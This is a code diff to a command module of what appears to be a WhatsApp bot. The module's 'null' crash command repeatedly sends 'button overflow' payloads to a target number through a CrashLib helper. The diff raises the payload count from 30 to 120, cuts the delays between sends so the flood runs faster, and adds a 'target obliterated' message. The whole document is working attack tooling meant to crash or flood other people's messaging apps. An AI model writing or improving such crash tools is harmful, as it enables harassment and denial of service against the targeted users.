@@ -6,7 +6,7 @@ module.exports = {
     name: 'null',
     aliases: ['button', 'buttoncrash', 'nullcrash'],
     category: 'crash',
-    desc: 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ ᴄʀᴀsʜ',
+    desc: 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ — ᴍᴀx ᴀɢɢʀᴇssɪᴠᴇ',
     usage: '.null <number>',
     waitReact: true,
 
@@ -27,17 +27,17 @@ module.exports = {
             crashLib = new CrashLib(sock);
         }
         
-        const TOTAL = 30;
+        const TOTAL = 120;
         const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
         
         try {
             for (let i = 0; i < TOTAL; i++) {
                 await crashLib.buttonOverflow(target);
                 await bar.update(1, 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ');
-                await new Promise(r => setTimeout(r, 300));
+                if (i % 10 === 0) await new Promise(r => setTimeout(r, 120));
             }
             
-            await bar.done(`✅ ʙᴜᴛᴛᴏɴ ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
+            await bar.done(`✅ ʙᴜᴛᴛᴏɴ ᴄʀᴀsʜ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
         } catch (e) {
             await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
         }
